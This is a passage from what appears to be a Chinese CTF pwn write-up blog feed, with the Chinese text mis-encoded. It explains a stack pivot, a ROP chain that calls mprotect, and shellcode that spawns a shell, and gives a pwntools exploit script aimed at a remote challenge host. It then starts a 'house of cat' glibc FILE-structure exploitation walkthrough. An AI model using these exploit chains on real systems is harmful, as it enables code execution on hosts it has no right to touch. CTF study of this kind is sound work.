src="/../img/image-20221007213922384.png"></p><p>å‘ç°æ­£å¸¸çš„è¯ï¼Œè¿™é‡Œçš„fdåº”è¯¥æ˜¯3ã€‚(ç„¶åå†çœ‹ä¸‹readå‡½æ•°çš„åä¸¤ä¸ªå‚æ•°)</p><p><img src="/../img/image-20221007213930111.png"></p><p><img src="/../img/image-20221007213939023.png" alt="image-20221007213939023"></p><p>ç„¶åå¾—å‡ºç»“è®ºï¼Œå¦‚æœfdæ˜¯0çš„è¯ï¼Œè¾“å…¥0x2cä¸ªæ•°æ®æ˜¯å¯ä»¥æº¢å‡ºåˆ°è¿”å›åœ°å€çš„ã€‚ä½†æ­£å¸¸æƒ…å†µä¸‹fdæ˜¯3ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ­£å¸¸æƒ…å†µä¸‹æˆ‘ä»¬å…¶å®æ²¡æ³•ç”¨è¿™ä¸ªreadä»stdinä¸Šè¾“å…¥æ•°æ®ã€‚æ‰€ä»¥å¿…é¡»è®©å®ƒä¸º0ï¼Œæ–¹æ³•å°±æ˜¯fgetsè¾“æ»¡ï¼Œå°†fdæº¢å‡ºæˆ0ï¼ˆä¸Šé¢æè¿‡äº†ï¼‰</p><h2 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h2><h3 id="æ§åˆ¶ç¬¬äºŒä¸ªreadçš„buf"><a href="#æ§åˆ¶ç¬¬äºŒä¸ªreadçš„buf" class="headerlink" title="æ§åˆ¶ç¬¬äºŒä¸ªreadçš„buf"></a>æ§åˆ¶ç¬¬äºŒä¸ªreadçš„buf</h3><p>ç”±äºæˆ‘ä»¬è¿™é“é¢˜æ²¡åŠæ³•æ³„éœ²libcåœ°å€ï¼Œä½†æ˜¯æ­£å¥½æœ‰ä¸ªmprotectå‡½æ•°ï¼Œæ‰€ä»¥å°±è€ƒè™‘å»æ‰§è¡Œmprotectè·å–ä¸€ç‰‡å¯è¯»å¯å†™å¯æ‰§è¡Œçš„åŒºåŸŸåï¼Œæ‰“shellcodeæ¥è·å–shellã€‚å°½ç®¡é¢˜ç›®close(1) ä½†æ˜¯æˆ‘ä»¬åªè¦å¯ä»¥è·å–shellï¼Œå°†è¾“å‡ºé‡å®šå‘ä¸€ä¸‹å³å¯ï¼Œæ‰€ä»¥é—®é¢˜ä¸å¤§ã€‚</p><p>ç„¶åç°åœ¨å°±è€ƒè™‘æ€ä¹ˆå»æ‰§è¡Œmprotectå‡½æ•°æ‰“shellcodeã€‚</p><p>ä¸Šé¢æåˆ°äº†ï¼Œæˆ‘ä»¬å¯ä»¥æº¢å‡ºåˆ°è¿”å›åœ°å€ï¼Œä½†æ˜¯ä¹Ÿä»…ä»…åªèƒ½æº¢å‡ºåˆ°è¿”å›åœ°å€ï¼Œæ‰€ä»¥è€ƒè™‘æ¥æ‰“ä¸€ä¸ªæ ˆè¿ç§»ã€‚</p><p>ä½†æ˜¯æœ€é‡è¦çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯æˆ‘ä»¬æ€ä¹ˆå°†æ•°æ®è¾“å…¥åˆ°è¿ç§»çš„åœ°æ–¹ã€‚å°±æ˜¯è¿ç§»ä¹‹åï¼Œæ‰§è¡Œå•¥ï¼Ÿ</p><p>æˆ‘ä»¬å†çœ‹çœ‹è¿˜æœ‰æ²¡æœ‰èƒ½åˆ©ç”¨çš„åœ°æ–¹äº†ï¼Œå‘ç°è¿˜æœ‰æœ€åä¸€ä¸ªreadå¯ä»¥ç”¨ã€‚</p><p><img src="/../img/image-20221007213948819.png"></p><p>è€Œè¿™ä¸ªreadè¾“å…¥çš„æ•°æ®æ˜¯å†™åˆ°äº†bufçš„ä½ç½®ã€‚</p><p><img src="/../img/image-20221007213959805.png" alt="image-20221007213959805"></p><p>è€Œbufåˆæ­£å¥½å¯ä»¥è¢«ç¬¬ä¸€æ¬¡readå‡½æ•°çš„æ•°æ®ç»™è¦†ç›–æ‰ï¼Œæ‰€ä»¥è¯´è¿™ä¸ªreadå†™å…¥æ•°æ®çš„åœ°å€å…¶å®æ˜¯å¯æ§çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†æ‰§è¡Œæµè¿ç§»åˆ°ä¸€ä¸ªå›ºå®šä¸”å·²çŸ¥çš„åœ°å€ï¼Œç„¶åå†ç”¨ç¬¬äºŒæ¬¡readå‘è¿ç§»çš„åœ°æ–¹å¸ƒç½®ä¸€ä¸ªropé“¾ã€‚</p><h3 id="å¸ƒç½®ropé“¾"><a href="#å¸ƒç½®ropé“¾" class="headerlink" title="å¸ƒç½®ropé“¾"></a>å¸ƒç½®ropé“¾</h3><p>æˆ‘æ„Ÿè§‰è¿™é“é¢˜å¸ƒç½®ropé“¾è¿™é‡Œä¹ŸæŒºå…³é”®çš„ï¼Œä¸çŸ¥é“å…¶ä»–å¸ˆå‚…å’Œæˆ‘çš„æ€è·¯ä¸€ä¸ä¸€æ ·ã€‚</p><p>æˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹æ‰§è¡Œè¿ç§»æ—¶å¯„å­˜å™¨çš„å€¼æœ‰æ²¡æœ‰ä»€ä¹ˆèƒ½åˆ©ç”¨çš„ã€‚</p><p><img src="/../img/image-20221007214008908.png" alt="image-20221007214008908"></p><p>æ­¤æ—¶æ˜¯æ ˆè¿ç§»æ—¶å¯„å­˜å™¨çš„å€¼ï¼Œæˆ‘ä»¬å‘ç°rdxçš„å€¼æ­£å¥½æ˜¯7ï¼Œè€Œæˆ‘ä»¬æœ€ç»ˆè¦æƒ³åŠæ³•æ‰§è¡Œmprotectå‡½æ•°çš„å€¼ä¹Ÿè¦æ˜¯7ï¼Œå› æ­¤rdxçš„å€¼å°±å¯ä»¥ç›´æ¥åˆ©ç”¨ï¼Œä¸éœ€è¦å†å»æ”¹å˜äº†(è¿™ä¸ªrdxæ˜¯strlenå‡½æ•°æ‰§è¡Œåç»™writeå‡½æ•°æ®‹ç•™ä¸‹æ¥çš„)ï¼ŒåŒæ—¶rsiçš„å€¼å¯¹äºmprotectå‡½æ•°æ¥è¯´æ˜¯æ›´æ”¹å†…å­˜æƒé™çš„å¤§å°ï¼Œå¾ˆæ˜æ˜¾æ­¤æ—¶çš„rsiä½œä¸ºå¤§å°çš„è¯ï¼Œä¹Ÿæ˜¯okçš„ã€‚</p><p>å› æ­¤æœ€åæˆ‘ä»¬åªéœ€è¦å°†rdiæ§åˆ¶ä½å³å¯ï¼Œæƒ³åŠæ³•å°†rdiæ”¹æˆ0x3ff000è¿™ä¸ªåœ°å€(å› ä¸ºæˆ‘é€‰æ‹©è¿ç§»åˆ°è¿™ä¸ªåœ°å€ä¸Š)ï¼Œä¹‹æ‰€ä»¥æ²¡è¿ç§»åˆ°bssæ®µä¸Šæ˜¯å› ä¸ºç¨‹åºæ‰§è¡Œäº†mprotectå‡½æ•°ï¼Œå°†0x400000ä»¥åŠåé¢0x402000 0x403000è¿™å‡ ä¸ªåŒºåŸŸçš„æƒé™éƒ½æ”¹æˆäº†rï¼Œå› æ­¤æ•°æ®å†™ä¸è¿›å»äº†â€¦æ‰€ä»¥åªèƒ½é€‰æ‹©è¿ç§»åˆ°ä¸Šé¢çš„0x3ff000å¤„ã€‚</p><p><img src="/../img/image-20221007214023209.png"></p><h3 id="æ§åˆ¶rdiå¯„å­˜å™¨"><a href="#æ§åˆ¶rdiå¯„å­˜å™¨" class="headerlink" title="æ§åˆ¶rdiå¯„å­˜å™¨"></a>æ§åˆ¶rdiå¯„å­˜å™¨</h3><p>æ¥ä¸‹æ¥å°±æ˜¯è€ƒè™‘æ€ä¹ˆæ§åˆ¶rdiå¯„å­˜å™¨ï¼Œå¯ä»¥è¯´æ§åˆ¶rdiæ˜¯å¸ƒç½®ropé“¾çš„æ ¸å¿ƒï¼Œå¦‚æœè¿™é‡Œæå®šäº†ï¼Œå‰©ä¸‹çš„ä¹Ÿå¾ˆå®¹æ˜“æå®šï¼Œå¦‚æœè¿™é‡Œå¡ä½çš„è¯ï¼Œå°±æ²¡æ³•ç»§ç»­ä¸‹å»äº†</p><p>æˆ‘ä»¬å…ˆä½¿ç”¨Ropgadgetæœä¸€ä¸‹ï¼Œå‘ç°æ²¡æœ‰èƒ½æ§åˆ¶rdiæˆ–è€…ediçš„å¯„å­˜å™¨çš„gadget</p><p><img src="/../img/image-20221007214034627.png"></p><p>å› æ­¤æˆ‘ä»¬åªèƒ½å»é—´æ¥æ§åˆ¶rdiçš„å€¼ï¼Œæˆ‘ä»¬å°†ç›®å…‰è½¬åˆ°call mprotectä¹‹å‰çš„æ±‡ç¼–ä¸Šã€‚</p><p><img src="/../img/image-20221007214042643.png" alt="image-20221007214042643"></p><p>å‘ç°rdiæ˜¯raxç»™çš„ã€‚æˆ‘ä»¬å»çœ‹çœ‹ï¼Œæœ‰æ²¡æœ‰gadgetèƒ½æ§åˆ¶raxæˆ–è€…eax</p><p><img src="/../img/image-20221007214117512.png" alt="image-20221007214117512"></p><p>æˆ‘ä»¬å‘ç°è¿™ä¸ªgadgetä¼¼ä¹èƒ½æ§åˆ¶eaxï¼Œåªè¦æˆ‘ä»¬èƒ½æ§åˆ¶rbpçš„è¯ï¼Œæœ€åå‘ç°å¾ˆè½»æ˜“çš„å°±å¯ä»¥ç”¨pop æ¥æ§åˆ¶rbp(å¦‚ä¸‹å›¾)ã€‚æ‰€ä»¥æˆ‘ä»¬é€šè¿‡rbpæ¥æ§åˆ¶eaxï¼Œé€šè¿‡eaxæ¥æ§åˆ¶mprotectå‡½æ•°çš„rdiå¯„å­˜å™¨ã€‚</p><p><img src="/../img/image-20221007214127795.png"></p><p>å› æ­¤æˆ‘ä»¬åœ¨ropé“¾ä¸Šå…ˆå†™ä¸€ä¸ªpop rbp;retçš„æŒ‡ä»¤ï¼Œç„¶åå°†[rbp-0x18]çš„å€¼ç»™eax(æˆ‘ä»¬éœ€è¦æå‰åœ¨rbp-0x18çš„ä½ç½®å¸ƒç½®å¥½eaxçš„å€¼)ï¼Œæœ€åæ”¾ä¸Š0x4012D5çš„åœ°å€å³å¯æ­£ç¡®æ‰§è¡Œmprotectå‡½æ•°äº†ã€‚</p><p><strong>æœ‰ä¸ªä¼ç¬”è¦æä¸€ä¸‹ï¼Œå°±æ˜¯æˆ‘ä»¬éœ€è¦æå‰åœ¨rbp-0x18çš„åœ°æ–¹å¸ƒç½®æˆ‘ä»¬çš„eaxå€¼(rbpçš„å€¼æ”¹0x3ff000-8,å› ä¸ºæˆ‘ä»¬è¦ä¿è¯è¿ç§»åæ­£å¥½è¦åˆ°0x3ff000è¿™ä¸ªåœ°å€)ï¼Œä¾¿äºåç»­çš„ropã€‚è€Œè¿™ä¸ªå€¼è¦äº§ç”Ÿå°±è¦åœ¨ç¬¬ä¸€æ¬¡readå‡½æ•°çš„æ—¶å€™å°†ç¬¬äºŒæ¬¡readçš„bufæ”¹æˆ0x3ff000-8ã€‚è¿™æ ·å†è¾“å…¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨0x3ff000-8çš„ä½ç½®æ”¾æˆeaxçš„å€¼äº†ï¼Œä¹‹åçš„0x3ff000å°±æ˜¯pop rbp;retçš„åœ°å€ï¼Œç„¶åå†å¾€ä¸‹æ˜¯rbpçš„å€¼ï¼Œæ¥ç€å°±æ˜¯mov eax, dword ptr [rbp - 0x18] ; leave ; retæŒ‡ä»¤çš„åœ°å€ã€‚è€Œè¿™ä¸ªæŒ‡ä»¤æ‰§è¡Œçš„æ—¶å€™[rbp-0x18]æ­£å¥½æŒ‡å‘çš„å°±æ˜¯eaxçš„å€¼(pop rbpçš„æ—¶å€™æŠŠrbpæ”¹æˆ0x3ff000+0x10)è¿™æ ·æ‰èƒ½ä¿è¯æ‰§è¡Œmov eax, dword ptr [rbp - 0x18] ; leave ; retæŒ‡ä»¤ä¸­çš„leave;retä¹‹åï¼Œå†ä¸€æ¬¡è¿ç§»è¿˜åœ¨ropé“¾ä¸Šã€‚(è¿™é‡Œçš„è¿‡ç¨‹è¦æ˜¯æ²¡ç†è§£çš„è¯ï¼Œå¯ä»¥å»å¯¹ç€è„šæœ¬è°ƒè¯•ä¸€ä¸‹ï¼Œåº”è¯¥å°±æ˜ç™½äº†ï¼Œæ„Ÿè§‰æˆ‘è¿™ä¹ˆç¡¬è®²ç¡®å®æœ‰ç‚¹ä¸å®¹æ˜“ç†è§£hh)</strong></p><p>å¯ä»¥è¯´è¿™é‡Œçš„å¸ƒå±€æ˜¯ä¸€ç¯æ‰£ä¸€ç¯ï¼Œé”™ä¸€ä¸ªåœ°å€éƒ½ä¸è¡Œ(å¯èƒ½å…¶ä»–å¸ˆå‚…ä¹Ÿæœ‰å…¶ä»–æ–¹æ³•å§)</p><p>è‡³æ­¤ropé“¾çš„æ ¸å¿ƒéƒ¨åˆ†å·²ç»è¯´æ˜å®Œäº†ï¼Œæœ€åå¡«ä¸Š0x4012D5è¿™ä¸ªåœ°å€(ä¹Ÿå°±æ˜¯call mprotectä¹‹å‰çš„é‚£ä¸ªmov rdi,rax),ç¨‹åºåˆ°è¿™é‡Œä¹‹åï¼Œå°±ä¼šé¡ºåˆ©æˆç« çš„æ‰§è¡Œmprotectå‡½æ•°äº†ã€‚(æ•ˆæœå¦‚ä¸‹å›¾)</p><p><img src="/../img/image-20221007214144313.png" alt="image-20221007214144313"></p><p>æœ€åç®—å¥½shellcodeçš„åœ°å€ï¼Œç„¶åå¸ƒç½®shellcodeçš„åœ°å€åˆ°ropé“¾ä¸Šã€‚æœ€ç»ˆå³å¯è·å–shellã€‚</p><p><img src="/../img/image-20221007214154568.png" alt="image-20221007214154568"></p><h2 id="æ‰“è¿œç¨‹çš„ä¸€ä¸ªå‘"><a href="#æ‰“è¿œç¨‹çš„ä¸€ä¸ªå‘" class="headerlink" title="æ‰“è¿œç¨‹çš„ä¸€ä¸ªå‘:"></a>æ‰“è¿œç¨‹çš„ä¸€ä¸ªå‘:</h2><p>å®é™…åšé¢˜çš„æ—¶å€™ï¼Œæˆ‘åªæ‰“é€šäº†æœ¬åœ°ï¼Œæ„Ÿè§‰ç¡®å®éƒ½æ²¡æœ‰é—®é¢˜ï¼Œä½†è¿œç¨‹å§‹ç»ˆæ²¡æœ‰é€šï¼Œè€Œä¸”è¿™é“é¢˜æˆ‘ä¹Ÿæ˜¯æ‹‰åˆ°21.10çš„dockerä¸­è·‘çš„ï¼Œè·Ÿè¿œç¨‹çš„libcä¹Ÿæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚ç„¶åæ‡µäº†å¾ˆä¹…å¾ˆä¹…ï¼Œæœ€ç»ˆ winmt å¸ˆå‚…æé†’æˆ‘è¯´ä¸‰æ¬¡payloadè¦ä¸€èµ·å‘é€(å°±æ˜¯æœ¬æ¥å‘ä¸‰æ¬¡payloadï¼Œä½†æ˜¯æ‰“è¿œç¨‹éœ€è¦3æ¬¡çš„payloadåˆæˆä¸€ä¸ªpayloadå‘é€ä¸€æ¬¡)æ‰èƒ½æ‰“é€šè¿œç¨‹ï¼Œemmmï¼Œè¿™ä¸ªç»“è®ºçš„åŸå› å¸ˆå‚…ä»¬ä¹Ÿæ²¡æœ‰ç»™å‡ºä¸€ä¸ªæ˜ç¡®çš„ç­”æ¡ˆï¼Œæ‰€ä»¥å…³äºè¿™ä¸ªé—®é¢˜æš‚ä¸”ä¸è°ˆã€‚</p><p>ä¸è¿‡æœ‰ä¸ªé—®é¢˜å°±æ˜¯ä¸€æ¬¡éƒ½å°†æ•°æ®å‘é€ç»™fgetså‡½æ•°ï¼Œæ­£å¸¸æ¥è¯´å¤šä½™çš„å­—èŠ‚éƒ½å­˜ç•™åœ¨äº†è¾“å…¥ç¼“å†²åŒºï¼Œä½†æ˜¯readå‡½æ•°å¹¶ä¸å­˜è¾“å…¥ç¼“å†²åŒºä¸­è¯»å…¥æ•°æ®ã€‚å¯readå‡½æ•°æœ€åä¹Ÿç¡®å®æ¥æ”¶åˆ°äº†æ•°æ®â€¦å› æ­¤æˆ‘å¯¹è¿™é‡Œæ„Ÿåˆ°éå¸¸ç–‘æƒ‘ã€‚æœ€ç»ˆè¯·æ•™äº† winmt å¸ˆå‚…å’Œ roderick å¸ˆå‚…ï¼Œç»ˆäºæ‰ææ˜ç™½è¿™é‡Œã€‚å› ä¸ºsetvbufå‡½æ•°å°†è¾“å…¥ç¼“å†²åŒºè®¾ç½®ä¸ºäº†æ¯æ¬¡è¯»å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œæ­£å¸¸æƒ…å†µä¸‹fgetså‡½æ•°æ˜¯è¯»å…¥æ•°æ®é‡åˆ°\nä¸ºæ­¢ï¼Œå°†è¿™äº›æ•°æ®å…¨éƒ¨è¯»å…¥åˆ°è¾“å…¥ç¼“å†²åŒºä¸­ï¼Œç„¶åå†ä»è¾“å…¥ç¼“å†²åŒºä¸­è¯»å…¥n-1ä¸ªå­—ç¬¦ã€‚è€Œsetvbufå‡½æ•°æ‰§è¡Œåfgetså‡½æ•°å°±å˜æˆäº†ä»ç¼“å†²åŒºä¸­ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦è¯»å…¥åï¼Œå†å°†å­—ç¬¦ç»™åˆ°æŒ‡å®šå†…å­˜åœ°å€ã€‚å› æ­¤è¯»å…¥n-1å­—ç¬¦åè‡ªç„¶å°±åœæ­¢äº†ï¼Œè€Œåé¢ä¸€èµ·å‘é€çš„æ•°æ®åˆ™ç•™åœ¨äº†stdinä¸­ï¼Œæœ€åread(0,buf,length)çš„æ—¶å€™è‡ªç„¶å°±ä»stdinä¸­è¯»å‡ºæ¥äº†æ•°æ®ã€‚</p><p>æœ€åæ‰“é€šäº†ï¼Œåˆ«å¿˜äº†å°†è¾“å‡ºé‡å®šå‘~</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;39.107.237.149&#x27;</span>,<span class="number">12998</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p,0x40145e,0x4014E3,0x401512)</span></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;please input your filename\n&#x27;,0x20*b&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">#debug(p,0x40145E)</span></span><br><span class="line">leave_ret=<span class="number">0x401511</span></span><br><span class="line">addr=<span class="number">0x3ff000</span></span><br><span class="line">add_rax=<span class="number">0x401297</span></span><br><span class="line">mov_eax=<span class="number">0x401351</span></span><br><span class="line">pop_rbp_addr=<span class="number">0x000000000040129d</span></span><br><span class="line">main_addr=<span class="number">0x401513</span></span><br><span class="line">payload=<span class="number">0x20</span>*<span class="string">b&#x27;a&#x27;</span>+(<span class="number">0x14</span>)*<span class="string">b&#x27;c&#x27;</span>+p64(addr-<span class="number">8</span>)+p64(addr-<span class="number">8</span>)+p64(leave_ret)+p64(<span class="number">0x3ff000</span>)+p64(pop_rbp_addr)+p64(<span class="number">0x3ff000</span>-<span class="number">8</span>+<span class="number">0x18</span>)+p64(mov_eax)+p64(<span class="number">0x4012D5</span>)+p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x3ff030</span>)+shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please input your filename\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendafter(&#x27;Please write the data you want to discard\n&#x27;,(0x14)*b&#x27;c&#x27;+p64(addr-8)+p64(addr-8)+p64(leave_ret))</span></span><br><span class="line"><span class="comment">#payload=p64(0x3ff000)+p64(pop_rbp_addr)+p64(0x3ff000-8+0x18)+p64(mov_eax)+p64(0x4012D5)+p64(0xdeadbeef)+p64(0x3ff030)+shellcode_store(&#x27;shell_64&#x27;)</span></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;please input your new data\n&#x27;,payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
            <tag> æ ˆè¿ç§» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house of cat -2022å¼ºç½‘æ¯pwnå¤ç°</title>
      <link href="/posts/7de5a5b7.html"/>
      <url>/posts/7de5a5b7.html</url>
      
        <content type="html"><![CDATA[<p>å‰å‡ å¤©è¿›è¡Œäº† <code>house of apple</code> çš„å­¦ä¹ ï¼Œè€Œ <code>house of appl2</code> å’Œ <code>house of cat</code> åˆ©ç”¨çš„å¤§è‡´æ€æƒ³æ˜¯ä¸€æ ·çš„ï¼ˆéƒ½æ˜¯é€šè¿‡ <code>wide_data-&gt;wide_vtable</code> ä¸­çš„å‡½æ•°æŒ‡é’ˆè¿›è¡Œçš„è·³è½¬ï¼‰ï¼Œå› æ­¤æ¥å¤ç°ä¸€ä¸‹å»å¹´å¼ºç½‘æ¯çš„è¿™é“ <code>house of cat</code></p><p>æœ¬é¢˜æˆ‘æ„Ÿè§‰ä¹Ÿæ¯”è¾ƒæœ‰ä»£è¡¨æ€§ï¼Œå› ä¸ºåœ¨ <code>house of apple</code> çš„é‚£ç¯‡æ–‡ç« ä¸­çš„ä¾‹é¢˜æœ€åè§¦å‘æ”»å‡»æ˜¯åœ¨ <code>exit</code> å‡½æ•°ï¼Œä½†æ˜¯å¦‚æœé¢˜ç›®ä¸­æ— æ³•ä» <code>main</code> å‡½æ•°è¿”å›ä¹Ÿæ²¡æœ‰ <code>exit</code> å‡½æ•°ï¼Œé‚£å°±éœ€è¦é€šè¿‡ <code>malloc_assert</code> æ¥è§¦å‘æœ€åçš„æ”»å‡»ï¼Œè€Œæœ¬é¢˜å°±æ˜¯é€šè¿‡è¿™æ ·çš„æ–¹å¼è§¦å‘çš„æ”»å‡»ã€‚</p><h3 id="å¦‚ä½•é€šè¿‡-malloc-assert-è§¦å‘æ”»å‡»"><a href="#å¦‚ä½•é€šè¿‡-malloc-assert-è§¦å‘æ”»å‡»" class="headerlink" title="å¦‚ä½•é€šè¿‡ malloc_assert è§¦å‘æ”»å‡»"></a>å¦‚ä½•é€šè¿‡ <code>malloc_assert</code> è§¦å‘æ”»å‡»</h3><p><code>__malloc_assert</code> å‡½æ•°ä¼šåœ¨å†…å­˜åˆ†é…å¤„ç†ä¹‹å‰æ£€æŸ¥è¯·æ±‚æ˜¯å¦åˆæ³•ï¼Œå¦‚æœæ£€æµ‹åˆ°ä¸åˆæ³•çš„è¯·æ±‚å°±ä¼šè§¦å‘æ–­è¨€å¹¶ç»ˆæ­¢ç¨‹åºï¼Œè§¦å‘è¿™ä¸ª <code>__malloc_assert</code> å‡½æ•°æœ‰å¾ˆå¤šå¤„ï¼Œ<strong>é€šå¸¸æˆ‘ä»¬é€‰æ‹©å°† <code>top chunk</code> çš„ <code>size</code>  æ”¹æˆéæ³•ï¼ˆåœ¨ <code>sysmalloc</code> å‡½æ•°ä¸­æœ‰é’ˆå¯¹è¿™é‡Œçš„æ£€æŸ¥ï¼‰ï¼Œè¿™æ ·å†æ¬¡ç”³è¯·å †å—çš„æ—¶å€™å°±ä¼šè§¦å‘ <code>__malloc_assert</code></strong></p><p><code>__malloc_assert</code> åœ¨ <code>2.35</code> çš„ <code>glibc</code> ä¸­æºç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line"> <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     file, line,</span><br><span class="line">     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰è¿™æ ·ä¸€æ¡æ‰§è¡Œé“¾ <code>__malloc_assert-&gt; __fxprintf-&gt;__vfxprintf-&gt;locked_vfxprintf-&gt;__vfprintf_internal-&gt;_IO_file_xsputn</code></p><p>æœ€åè§¦å‘çš„ <code>_IO_file_xsputn</code> æ˜¯é€šè¿‡ <code>vtable</code> ä¸­çš„å‡½æ•°æŒ‡é’ˆæ¥è§¦å‘çš„ï¼Œæˆ‘ä»¬æƒ³è¦å»åŠ«æŒçš„è¯ï¼Œé¦–å…ˆå°† <code>_IO_2_1_stderr</code> ç»“æ„ä½“ä¸­çš„ <code>vtable</code> æ”¹æˆ <code>_IO_wfile_jumps+0x10</code> çš„åœ°å€ï¼ˆåŠ  <code>0x10</code> çš„åŸå› æ˜¯ <code>_IO_file_xsputn</code> çš„åœ°å€åœ¨ <code>_IO_file_jumps</code> ä¸­æ¯” <code>IO_file_seekoff</code> çš„åœ°å€ä½ <code>0x10</code> ä¸ªå­—èŠ‚ï¼‰ï¼Œè¿™æ ·åŸæœ¬è·³è½¬æ‰§è¡Œ <code>_IO_file_xsputn</code> æ—¶ï¼Œå®é™…ä¸Šæ‰§è¡Œçš„æ˜¯ <code>_IO_wfile_seekoff</code> å¦‚ä¸‹å›¾</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302040938184.png" alt="image-20230204093820778"></p><p><code>_IO_wfile_seekoff</code> å‡½æ•°æºç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ‰§è¡Œ <code>_IO_wfile_seekoff</code> å‡½æ•°çš„ç›®çš„å°±æ˜¯ä¸ºäº†è§¦å‘ <code>_IO_switch_to_wget_mode</code> å‡½æ•°</p><p><code>_IO_switch_to_wget_mode</code> å‡½æ•°æºç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>_IO_switch_to_wget_mode</code> å‡½æ•°çš„ç›®çš„å°±æ˜¯ä¸ºäº†è§¦å‘ <code>_IO_WOVERFLOW</code> ,å› ä¸ºè¿™ä¸ª <code>_IO_WOVERFLOW</code> å‡½æ•°æ˜¯é€šè¿‡ <code>_wide_data-&gt;_wide_vtable</code> ä¸­æ‰€å­˜æ”¾çš„å‡½æ•°æŒ‡é’ˆè¿›è¡Œè·³è½¬çš„ï¼Œ <code>_wide_vtable</code> æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œä»è€Œåœ¨è¿™é‡Œå¯ä»¥åŠ«æŒç¨‹åºçš„æ‰§è¡Œæµã€‚</p><p>æƒ³è§¦å‘æœ€åçš„ <code>_IO_WOVERFLOW</code> ï¼Œéœ€è¦æ»¡è¶³ <code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code> è¿™ä¸ªæ¡ä»¶ã€‚</p><p>ä¹‹æ‰€ä»¥å…ˆæä¸Šé¢çš„éƒ¨åˆ†æ˜¯å› ä¸ºæœ¬é¢˜æ¥ä¸‹æ¥ç”¨çš„æ‰‹æ³•åªæœ‰ä¸Šé¢éƒ¨åˆ†æ˜¯ <code>house of apple2</code>  